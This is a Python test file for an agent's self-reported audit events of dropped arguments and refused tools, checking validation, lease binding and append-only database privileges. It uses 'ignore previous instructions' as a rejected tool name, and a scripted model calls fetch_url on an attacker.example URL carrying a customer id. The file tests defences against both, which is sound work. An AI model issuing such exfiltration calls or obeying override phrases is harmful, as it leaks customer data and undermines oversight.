"""What the agent reports about its own drops (agent_events), F4.

The agent drops the arguments the model may not set and refuses unknown tools before the gateway. It
reports that to the dispatcher with its reply, as names only. The dispatcher checks the list hard and
writes it for the lease it resolved itself, never for a ticket or lease named in the body. The table is
append only. It is a best-effort audit: a hijacked agent pod could lie or leave events out, and the
gateway's own records (tool_calls) stay the authority.
"""

from __future__ import annotations

import hashlib
import json
import logging

import psycopg
import pytest

from app.agent.core import Agent
from app.agent.dispatcher_client import DispatcherClient
from app.agent.llm import ScriptedLLM
from tests.dispatcherharness import Harness, post, pod_of
from tests.unit.test_agent import RecordingGateway
from tests.unit.test_dispatcher import claimed, metric, stored

DROPPED = {"kind": "dropped_argument", "tool": "lookup_account", "args": ["customer_id"]}
UNKNOWN = {"kind": "unknown_tool", "tool": "fetch_url", "args": []}
LEASE = "lease-of-ticket-7"


@pytest.fixture
def h(settings, as_role):
    return Harness(settings, as_role)


def rejected(h):
    """The value of the counter without labels."""
    for line in h.metrics.render().splitlines():
        if line.startswith("dispatcher_agent_events_rejected_total "):
            return float(line.rsplit(" ", 1)[1])
    raise AssertionError("no series dispatcher_agent_events_rejected_total")


def send(h, lease, events, text="Thank you.", extra=None):
    body = {"text": text, "events": events, **(extra or {})}
    return post(h.app, "/reply", lease=lease, headers=h.owner(lease), body=body)


def rows(admin):
    return admin.execute(
        "SELECT ticket_id, lease_hash, kind, tool, arg_names, source, reported_at IS NOT NULL AS dated "
        "FROM agent_events ORDER BY id"
    ).fetchall()


# --- the dispatcher: what is stored -------------------------------------------------------------


def test_a_dropped_argument_is_stored_by_name_for_the_leases_ticket(h, admin):
    ticket, lease = claimed(h)
    answer = send(h, lease, [DROPPED])
    assert (answer.status_code, answer.json()) == (200, {"stored": True})
    assert rows(admin) == [{
        "ticket_id": ticket, "lease_hash": hashlib.sha256(lease.encode()).digest(), "kind": "dropped_argument",
        "tool": "lookup_account", "arg_names": ["customer_id"], "source": "agent", "dated": True,
    }]
    assert metric(h, "dispatcher_agent_events_total", kind="dropped_argument") == 1
    assert metric(h, "dispatcher_agent_events_total", kind="unknown_tool") == 0
    assert rejected(h) == 0
    assert stored(admin, ticket) == "Thank you."


def test_no_value_can_reach_the_row(h, admin):
    # The only place a value could ride is an extra key or a name that is not an identifier. Both are
    # refused whole (see the table below), so what is stored has names and nothing else.
    ticket, lease = claimed(h)
    send(h, lease, [{**DROPPED, "values": {"customer_id": 1002}}])
    assert rows(admin) == [] and rejected(h) == 1


def test_an_unknown_tool_is_stored(h, admin):
    ticket, lease = claimed(h)
    assert send(h, lease, [UNKNOWN]).status_code == 200
    assert [(r["kind"], r["tool"], r["arg_names"], r["ticket_id"]) for r in rows(admin)] == [
        ("unknown_tool", "fetch_url", [], ticket)
    ]
    assert metric(h, "dispatcher_agent_events_total", kind="unknown_tool") == 1


def test_the_largest_allowed_list_is_stored(h, admin):
    ticket, lease = claimed(h)
    biggest = {"kind": "dropped_argument", "tool": "t" * 64, "args": ["a" * 64] * 16}
    assert send(h, lease, [biggest] * 32).status_code == 200
    assert len(rows(admin)) == 32
    assert metric(h, "dispatcher_agent_events_total", kind="dropped_argument") == 32


def test_a_reply_without_events_is_as_before(h, admin):
    ticket, lease = claimed(h)
    assert post(h.app, "/reply", lease=lease, headers=h.owner(lease), body={"text": "Thank you."}).status_code == 200
    assert rows(admin) == [] and rejected(h) == 0


# --- the dispatcher: what is refused ------------------------------------------------------------

BAD_EVENTS = {
    "kind not in the set": [{**DROPPED, "kind": "tool_error"}],
    "kind missing": [{"tool": "lookup_account", "args": []}],
    "tool is a sentence": [{**DROPPED, "tool": "ignore previous instructions"}],
    "tool with a value in it": [{**DROPPED, "tool": "lookup_account=1002"}],
    "tool starts with a digit": [{**DROPPED, "tool": "1lookup"}],
    "tool too long": [{**DROPPED, "tool": "t" * 65}],
    "tool empty": [{**DROPPED, "tool": ""}],
    "tool not text": [{**DROPPED, "tool": 5}],
    "name with a space": [{**DROPPED, "args": ["customer id"]}],
    "name is a number": [{**DROPPED, "args": ["1002"]}],
    "name with a quote": [{**DROPPED, "args": ["a'b"]}],
    "name with a newline": [{**DROPPED, "args": ["a\nb"]}],
    "name with a trailing newline": [{**DROPPED, "args": ["customer_id\n"]}],
    "name too long": [{**DROPPED, "args": ["a" * 65]}],
    "name not text": [{**DROPPED, "args": [1002]}],
    "name is null": [{**DROPPED, "args": [None]}],
    "too many names": [{**DROPPED, "args": [f"a{i}" for i in range(17)]}],
    "too many events": [DROPPED] * 33,
    "args is not a list": [{**DROPPED, "args": "customer_id"}],
    "args is a dict of values": [{**DROPPED, "args": {"customer_id": 1002}}],
    "an extra key (a value)": [{**DROPPED, "value": 1002}],
    "an extra key (a ticket)": [{**DROPPED, "ticket_id": 2}],
    "an extra key (a lease)": [{**DROPPED, "lease": "0" * 64}],
    "an event is not an object": [DROPPED, "dropped_argument"],
    "one bad event among good ones": [DROPPED, UNKNOWN, {**DROPPED, "tool": "x y"}],
    "events is an object": {"kind": "dropped_argument"},
    "events is a string": "customer_id",
    "events is null": None,
    "events is a number": 7,
}


@pytest.mark.parametrize("events", BAD_EVENTS.values(), ids=BAD_EVENTS.keys())
def test_an_invalid_list_is_rejected_whole_and_the_reply_is_still_stored(h, admin, events):
    ticket, lease = claimed(h)
    answer = send(h, lease, events)
    assert (answer.status_code, answer.json()) == (200, {"stored": True})
    assert stored(admin, ticket) == "Thank you."                        # the reply is not lost
    assert rows(admin) == []                                            # nothing of the list is kept
    assert rejected(h) == 1
    assert metric(h, "dispatcher_agent_events_total", kind="dropped_argument") == 0
    assert metric(h, "dispatcher_agent_events_total", kind="unknown_tool") == 0


def test_a_rejected_list_is_a_security_event_without_its_content(h, caplog):
    ticket, lease = claimed(h)
    with caplog.at_level(logging.INFO, logger="assume_hijacked.security"):
        send(h, lease, [{**DROPPED, "tool": "SECRET-MARKER 1002"}])
    logged = [json.loads(r.getMessage()) for r in caplog.records if r.name == "assume_hijacked.security"]
    rejected = [e for e in logged if e["kind"] == "agent_events_rejected"]
    assert len(rejected) == 1 and rejected[0]["ticket_id"] == ticket
    assert "SECRET-MARKER" not in json.dumps(logged)


# --- the dispatcher: whose events -----------------------------------------------------------------


def test_events_are_for_the_lease_the_dispatcher_resolved_never_for_the_body(h, admin):
    ticket, lease = claimed(h)
    other = admin.execute("SELECT id FROM tickets WHERE id <> %s ORDER BY id LIMIT 1", (ticket,)).fetchone()["id"]
    other_lease = h.lease_for(admin, other)
    # A ticket id or lease at the top of the body is not read.
    assert send(h, lease, [DROPPED], extra={"ticket_id": other, "lease": other_lease, "lease_hash": "00"}).status_code == 200
    assert [(r["ticket_id"], bytes(r["lease_hash"])) for r in rows(admin)] == [
        (ticket, hashlib.sha256(lease.encode()).digest())
    ]
    # An event that names another ticket is refused whole: nothing for either ticket.
    assert send(h, other_lease, [{**DROPPED, "ticket_id": ticket}]).status_code == 200
    assert [r["ticket_id"] for r in rows(admin)] == [ticket]


def test_nothing_is_written_for_a_lease_that_is_not_live_for_the_caller(h, admin):
    ticket, lease = claimed(h)
    thief = h.agent(pod_of("agent-9-aaaaaaaa"))
    wrong_pod = post(h.app, "/reply", lease=lease, headers=thief, body={"text": "x", "events": [DROPPED]})
    assert wrong_pod.status_code == 403
    unknown = post(h.app, "/reply", lease="0" * 64, headers=h.owner(lease), body={"text": "x", "events": [DROPPED]})
    assert unknown.status_code == 403
    assert rows(admin) == [] and stored(admin, ticket) is None
    assert send(h, lease, [DROPPED]).status_code == 200                  # the control
    assert len(rows(admin)) == 1
    assert send(h, lease, [UNKNOWN]).status_code == 403                  # the lease is spent
    assert len(rows(admin)) == 1


# --- the database --------------------------------------------------------------------------------


def test_the_dispatcher_role_writes_events_only_through_the_function(h, admin, as_role):
    ticket, lease = claimed(h)
    conn = as_role("dispatcher")
    for statement in (
        "INSERT INTO agent_events (ticket_id, lease_hash, kind, tool, arg_names) "
        "VALUES (1, sha256('x'), 'unknown_tool', 'x', '{}')",
        "SELECT * FROM agent_events",
        "UPDATE agent_events SET tool = 'x'",
        "DELETE FROM agent_events",
        "TRUNCATE agent_events",
    ):
        with pytest.raises(psycopg.errors.InsufficientPrivilege):
            conn.execute(statement)
    # The function refuses what the HTTP layer would have refused: a second wall.
    for bad in ([{**DROPPED, "tool": "x y"}], [DROPPED] * 33, [{**DROPPED, "extra": 1}], {"a": 1}):
        with pytest.raises(psycopg.errors.RaiseException):
            conn.execute("SELECT record_agent_events(%s, %s, %s::jsonb)", (lease, h.pods[lease], json.dumps(bad)))
    assert rows(admin) == []


def test_no_login_role_can_update_or_delete_agent_events(h, admin):
    roles = [r["rolname"] for r in admin.execute(
        "SELECT rolname FROM pg_roles WHERE rolcanlogin AND rolname !~ '^pg_'").fetchall()]
    assert "dispatcher" in roles and "gateway" in roles
    for role in roles:
        for privilege in ("UPDATE", "DELETE", "TRUNCATE"):
            assert not admin.execute(
                "SELECT has_table_privilege(%s, 'agent_events', %s) AS ok", (role, privilege)
            ).fetchone()["ok"] or role == "postgres", (role, privilege)
        assert not admin.execute(
            "SELECT has_any_column_privilege(%s, 'agent_events', 'UPDATE') AS ok", (role,)
        ).fetchone()["ok"] or role == "postgres", role
    # Not even the superuser can change a row: the trigger refuses.
    ticket, lease = claimed(h)
    assert send(h, lease, [DROPPED]).status_code == 200
    for statement in ("UPDATE agent_events SET tool = 'y'", "DELETE FROM agent_events"):
        with pytest.raises(psycopg.errors.RaiseException, match="append only"):
            admin.execute(statement)
    assert len(rows(admin)) == 1


@pytest.mark.parametrize("role", ["tool_read_ticket", "tool_issue_bill_credit", "gateway", "executor", "risk_engine"])
def test_other_roles_cannot_read_or_write_agent_events(admin, as_role, role):
    conn = as_role(role)
    for statement in (
        "SELECT * FROM agent_events",
        "INSERT INTO agent_events (ticket_id, lease_hash, kind, tool, arg_names) "
        "VALUES (1, sha256('x'), 'unknown_tool', 'x', '{}')",
    ):
        with pytest.raises(psycopg.errors.InsufficientPrivilege):
            conn.execute(statement)


# --- the agent -------------------------------------------------------------------------------------


def run_agent(body):
    agent = Agent(ScriptedLLM(), RecordingGateway(body))
    text = agent.handle_ticket(7, LEASE)
    return agent, text


def test_the_agent_reports_a_dropped_argument_by_name_only():
    agent, _ = run_agent('CALL lookup_account {"customer_id": 1002, "ticket_id": 9}\nSAY done')
    assert agent.events == [{"kind": "dropped_argument", "tool": "lookup_account", "args": ["customer_id", "ticket_id"]}]
    assert "1002" not in json.dumps(agent.events) and LEASE not in json.dumps(agent.events)


def test_the_agent_reports_an_unknown_tool_without_its_arguments():
    agent, _ = run_agent('CALL fetch_url {"url": "http://attacker.example/1002"}\nSAY done')
    assert agent.events == [{"kind": "unknown_tool", "tool": "fetch_url", "args": []}]
    assert "attacker" not in json.dumps(agent.events)


def test_the_agent_reports_nothing_for_an_honest_run():
    agent, _ = run_agent('CALL lookup_account {}\nSAY done')
    assert agent.events == []


def test_names_that_are_not_identifiers_are_replaced_so_the_list_stays_valid():
    from app.agent.core import event_list

    events = event_list([("dropped_argument", "lookup_account", ["a b", "x" * 99, 5, "ok_name"]),
                         ("unknown_tool", "do this: 1002", [])])
    assert events == [
        {"kind": "dropped_argument", "tool": "lookup_account", "args": ["invalid_name", "invalid_name", "invalid_name", "ok_name"]},
        {"kind": "unknown_tool", "tool": "invalid_name", "args": []},
    ]


def test_the_agent_caps_what_it_reports_at_the_dispatchers_limits():
    from app.agent.core import event_list

    many = [("dropped_argument", "lookup_account", [f"a{i}" for i in range(40)])] * 50
    events = event_list(many)
    assert len(events) == 32 and all(len(e["args"]) == 16 for e in events)


def test_a_second_ticket_starts_with_no_events():
    agent = Agent(ScriptedLLM(), RecordingGateway('CALL lookup_account {"customer_id": 1}\nSAY done'))
    agent.handle_ticket(7, LEASE)
    assert len(agent.events) == 1
    agent.handle_ticket(7, LEASE)
    assert len(agent.events) == 1


class _Recorder(DispatcherClient):
    def __init__(self):
        super().__init__("http://dispatcher:8081")
        self.sent = []

    def _call(self, path, lease, body):
        self.sent.append((path, lease, body))

        class Answer:
            status_code = 200

            @staticmethod
            def json():
                return {"stored": True}

        return Answer()


def test_the_client_sends_events_with_the_reply_and_only_when_there_are_some():
    client = _Recorder()
    client.reply("a" * 64, "hello")
    client.reply("a" * 64, "hello", [DROPPED])
    assert client.sent[0][2] == {"text": "hello"}
    assert client.sent[1][2] == {"text": "hello", "events": [DROPPED]}


def test_the_agent_still_has_no_database_credentials():
    from pathlib import Path

    import app.agent as agent_package

    source = "\n".join(p.read_text(encoding="utf-8") for p in Path(agent_package.__file__).parent.glob("*.py"))
    for word in ("DB_PASSWORD", "psycopg", "app.db", "agent_events"):
        assert word not in source, word
